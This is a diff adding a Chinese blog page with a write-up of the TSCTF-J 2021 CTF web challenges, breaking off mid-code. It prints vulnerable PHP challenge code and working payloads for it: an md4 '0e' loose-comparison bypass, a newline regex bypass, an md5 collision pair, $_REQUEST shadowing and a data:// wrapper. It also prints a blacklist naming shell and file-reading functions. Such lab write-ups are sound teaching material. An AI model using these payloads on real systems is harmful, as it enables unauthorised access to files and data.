@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="TSCTF-J 2021  WP King of F12  SimplePHP  ezbypass    ​    前言: ​    连着打了两天的TSCTF-J，感觉挺有意思的。我感觉CTF和NOIP一个很大的差别就是它能上网搜，但是这并不代表CTF就比NOIP简单，相反，这不仅考验思维，更考验对搜索引擎的熟练运用、信息的提取以及对新知识的迅速吸收并利用。在众多方向中最吸引我的还是Web (虽然">
+<meta property="og:type" content="website">
+<meta property="og:title" content="TSCTF-J WP">
+<meta property="og:url" content="http://example.com/WP/TSCTF-J%202021.html">
+<meta property="og:site_name" content="摸鱼小店">
+<meta property="og:description" content="TSCTF-J 2021  WP King of F12  SimplePHP  ezbypass    ​    前言: ​    连着打了两天的TSCTF-J，感觉挺有意思的。我感觉CTF和NOIP一个很大的差别就是它能上网搜，但是这并不代表CTF就比NOIP简单，相反，这不仅考验思维，更考验对搜索引擎的熟练运用、信息的提取以及对新知识的迅速吸收并利用。在众多方向中最吸引我的还是Web (虽然">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024194907935.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024195720973.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025115324602.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025140404795.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025142054801.png">
+<meta property="article:published_time" content="2021-10-24T16:11:22.000Z">
+<meta property="article:modified_time" content="2021-10-30T15:59:32.976Z">
+<meta property="article:author" content="店長">
+<meta property="article:tag" content="WP">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024194907935.png">
+
+<link rel="canonical" href="http://example.com/WP/TSCTF-J%202021">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>TSCTF-J WP | 摸鱼小店
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">摸鱼小店</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">你从前面右转的第二排架子上就有了。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">TSCTF-J WP
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <h1 id="TSCTF-J-2021-WP"><a href="#TSCTF-J-2021-WP" class="headerlink" title="TSCTF-J 2021  WP"></a><strong>TSCTF-J 2021  WP</strong></h1><ul>
+<li><p><em><strong>King of F12</strong></em></p>
+</li>
+<li><p><em><strong>SimplePHP</strong></em></p>
+</li>
+<li><p><em><strong>ezbypass</strong></em></p>
+</li>
+</ul>
+<blockquote>
+<p>​    <strong>前言</strong>:</p>
+<p>​    连着打了两天的TSCTF-J，感觉挺有意思的。我感觉CTF和NOIP一个很大的差别就是它能上网搜，但是这并不代表CTF就比NOIP简单，相反，这不仅考验思维，更考验对搜索引擎的熟练运用、信息的提取以及对新知识的迅速吸收并利用。在众多方向中最吸引我的还是Web <del>(虽然这次几乎算是爆零)</del> 其次就是逆向，可能是从初三开始的对黑小网站的渴望使然吧、也可能是对一些Web渗透操作的喜爱吧，逆向应该就是对写软件外挂的渴望(当然逆向肯定不止这种东西)。虽然现在我很菜，但是我会一直努力的！！！</p>
+<p>​    另外，我觉得特别好玩的一件事就是Web手好像要啥都会一点，在编程语言方面尤为突出。现在我能稍微熟练运用一下的就是C++，不过我对它的了解也仅限于写程序输入输出罢了，感觉和Web完全搭不上边。所以接下来的首要任务就是重点学习一下python和php，题也做得太少了，加油罢！</p>
+</blockquote>
+<h2 id="King-of-F12"><a href="#King-of-F12" class="headerlink" title="King  of F12"></a>King  of F12</h2><blockquote>
+<p>签到题，起手一枪秒了，还有什么好说的</p>
+</blockquote>
+<p>​     打开页面发现只有不停跳动着的 <del>屏保图案</del> 烟花，想想题目名字和F12有关，于是坚毅而果断的按下F12.看看源码之后发现这么一句话 </p>
+<blockquote>
+ <!--
+     To be the King of F12 maybe you have to go ./CHALLENGE-BUTTONKNIGHT.php
+    -->
+</blockquote>
+<p>​    那就到 <em>/CHALLENGE-BUTTONKNIGHT.php</em> 看看罢</p>
+<p>​    是消失的按钮，直接进行检查删除 <strong>disabled</strong>  (攻防世界新手入门难度get<strong>√</strong>) ，获得提示</p>
+<blockquote>
+<p>You are the hero, and the flag is waiting for you at ./handcrusher.php</p>
+</blockquote>
+<p>​    来到了 <del>我最喜欢的</del> 手刃詹爹的环节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024194907935.png" alt="image-20211024194907935">[^1]:不愧是大爹，好(<del>臭</del>)厚的血</p>
+<p>​    首先想到直接用连点器莽过去，但是点了半天发现一二三血都被拿完了我还连1/5都没砍完，于是开始找规律。发现是名字越长攻击越高，正好我开了不少搜索的标签，直接进行一个复制粘贴， 爆杀！拿到茯苓哥哥的flag.   </p>
+<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211024195720973.png" alt="image-20211024195720973">[^2]: 才发现f0还在卖萌 XD</p>
+<hr>
+<hr>
+<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><blockquote>
+<p>  遇见simple、ez就快跑，没好果汁吃       </p>
+</blockquote>
+<p>​    进入网站后看到一大串代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;乐&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^i_am_bloodhound$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] !== <span class="string">&#x27;i_am_bloodhound&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是布洛特亨德尔!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;众神之父赐予我视野&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;众神之父赐予我重伤倒地&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;众神之父不喜欢英文&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;phoniex_kit&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我重伤倒地&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>​    一道 <strong>代码审计</strong> 的题，考的点很常规，但是对刚入门的我来说还是难度不小 <del>（希望以后别了）</del></p>
+<p>​    </p>
+<h3 id="第一部分-md4弱类型比较"><a href="#第一部分-md4弱类型比较" class="headerlink" title="第一部分 ( md4弱类型比较 )"></a>第一部分 ( <em>md4</em>弱类型比较 )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;secret&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;乐&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    考点为md4弱类型比较，Google一下发现是与 <strong>PHP中的Hash缺陷</strong> 有关，<strong>0e</strong>+<strong>纯数字</strong> 的组合会被认为是科学计数法，即被看作是 <strong>0的xxxxxx次方</strong>，值均为0，且 <strong>==</strong> 为弱类型比较，<strong>不比较类型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload: secret=0e251288019</span><br><span class="line">或者</span><br><span class="line">payload: secret=0e001233333333333334557778889</span><br></pre></td></tr></table></figure>
+
+<p>​    成功绕过 </p>
+<h3 id="第二部分-preg-match-‘-‘-GET-‘xxx’-绕过"><a href="#第二部分-preg-match-‘-‘-GET-‘xxx’-绕过" class="headerlink" title="第二部分 ( preg_match(‘/^$/‘, $_GET[‘xxx’]) 绕过 )"></a>第二部分 ( <em>preg_match(‘/^$/‘, $_GET[‘xxx’])</em> 绕过 )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^i_am_bloodhound$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] !== <span class="string">&#x27;i_am_bloodhound&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是布洛特亨德尔!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    对于 **preg_match(‘/^$/‘, $_GET[‘xxx’])**，只会去比较第一行，在末尾加上换行符 <em><strong>%0a</strong></em> 即可绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: name=i_am_bloodhound%0a</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="第三部分-md5-强碰撞-string"><a href="#第三部分-md5-强碰撞-string" class="headerlink" title="第三部分 ( md5 强碰撞 (string) )"></a>第三部分 ( <em>md5</em> 强碰撞 (string) )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s1&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;s2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;众神之父赐予我视野&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;众神之父赐予我重伤倒地&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>md5强碰撞</strong>，***===*** 进行了严格的过滤，且 <em><strong>string</strong></em> 限制了只能传入字符串，则必须使用两个不同但md5加密后完全相同的字符串来绕过，于是搜到了这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a> ，构造出一对符合要求的字符串后将其进行url编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: s1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;s2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+<p>​    由于含有不可见字符，其md5加密相同，但url编码后不同，满足需求，过</p>
+<h3 id="第四部分-REQUEST-绕过"><a href="#第四部分-REQUEST-绕过" class="headerlink" title="第四部分 ( $_REQUEST 绕过 )"></a>第四部分 ( <em>$_REQUEST</em> 绕过 )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;众神之父不喜欢英文&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong>$_REQUEST</strong> <em>同时接受GET和POST的数据，并且在同时传入数据时优先接受POST</em> （虽然是个考烂了的点，但是当时我还是搞了好半天才绕过），把之前出现过的变量再用post传一次，且传入的值不出现所有英文字符(由 <em>‘/[a-zA-Z]/i’</em> 判断)就能过了 (不得不说Firefox的hackbar是真的好用)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: secret=1&amp;name=1&amp;s1=1&amp;s2=1    </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="第五部分-file-get-contents-file-详解"><a href="#第五部分-file-get-contents-file-详解" class="headerlink" title="第五部分 ( file_get_contents($file) 详解 )"></a>第五部分 ( <em>file_get_contents($file)</em> 详解 )</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;phoniex_kit&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我重伤倒地&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    说实话这个地方我当时抄都没抄懂，于是在这儿稍微详细的记录一下。</p>
+<blockquote>
+<p>*file_get_contents()*用于把整个文件读入一个字符串中</p>
+<p>语法为: <strong>file_get_contents(path,include_path,context,start,max_length)</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">path</td>
+<td align="center">必需。规定所读取的文件(如”text.txt“)</td>
+</tr>
+<tr>
+<td align="center">include_path</td>
+<td align="center">可选。当该参数设为”1“时也在 include_path 中搜寻文件 <del>(看不懂)</del></td>
+</tr>
+<tr>
+<td align="center">context</td>
+<td align="center">可选。规定文件句柄的环境。<br>context 是一套可以修改流的行为的选项。若使用 null，则忽略。 <del>(看不懂)</del></td>
+</tr>
+<tr>
+<td align="center">start</td>
+<td align="center">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
+</tr>
+<tr>
+<td align="center">max_length</td>
+<td align="center">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。(防爆)</td>
+</tr>
+</tbody></table>
+<h6 id="例子-假设text-txt文件中的内容为test"><a href="#例子-假设text-txt文件中的内容为test" class="headerlink" title="例子   (假设text.txt文件中的内容为test)"></a>例子   (假设text.txt文件中的内容为<em>test</em>)</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<p>​    一般来说可用 <em><strong>php://input</strong></em> 或 <em><strong>data://</strong></em> </p>
+<blockquote>
+<p><strong>php://input</strong> 将post传来的数据全部当作文件内容，可以读取未处理过的POST数据</p>
+<p><strong>data://</strong> 用GET方法进行传输 ，有以下几种用法</p>
+<pre><code>    1. *data://text/plain,\&lt;?php phpinfo()?&gt;*
+    2. *data://text/plain;base64,(base64加密后的信息)*
+</code></pre>
+</blockquote>
+<p>我采用的是data的第二种方法，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[GET] file=data://text/plain;base64,cGhvbmlleF9raXQ=</span><br><span class="line">[POST] file=1        (绕过第四部分)</span><br></pre></td></tr></table></figure>
+
+<p>​    拿到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dianzzz/dzimg/data/image-20211025115324602.png" alt="image-20211025115324602"></p>
+<hr>
+<hr>
+<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><blockquote>
+<p>摸索了好半天终于学到了 <em>create_function()</em> 的注入，痛并快乐着</p>
+</blockquote>
+<p>​    开屏又是一堆代码，同是代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$www1</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$www2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$www2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;www2&#x27;</span>];</span><br><span class="line"><span class="variable">$www1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;www1&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">    preg_match(<span class="string">&#x27;/flag|www|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|ec|ead|inc|1f|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_REQUEST</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;bbb&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag|fi|arra|mor|ta|le|he|nl|hex|as|cat|ev|so|shel|ob|st|ma|`|ec|ead|inc|lf|log|np|ess|chr|cal|bin|sh|nt|gh|reve|flip|rand|con|ot|id|pr|info|oct|pi/i&#x27;</span>, <span class="variable">$www1</span>) ||</span><br><span class="line">    preg_match(<span 